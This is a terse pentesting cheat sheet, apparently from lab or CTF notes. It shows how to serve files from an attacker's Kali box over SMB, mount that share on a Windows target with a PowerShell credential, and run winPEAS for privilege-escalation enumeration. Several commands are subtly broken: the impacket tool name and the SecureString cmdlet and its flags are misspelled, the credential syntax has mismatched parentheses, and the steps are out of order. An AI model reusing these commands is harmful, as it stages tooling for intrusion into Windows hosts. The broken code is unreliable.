# Start SMB Server
```
impacket-smserver 'sharename' $(pwd) -smb2support -user username -password password
```

# Create username and password on Win
create user
```
$cred = New-Object System.Management.Automation.PSCredential()'ippsec', $pass)
```
create password
```
$pass = ConverTo-SecureString 'password' -AsPlaintText -force
```
attach the smb server driver

```
New-PSDrive -Name user -PSProvider Filesystem -Credential $cred -Root \\ipaddressofkali\Sharename
```

# Run WInpeas
.\winpeas.exe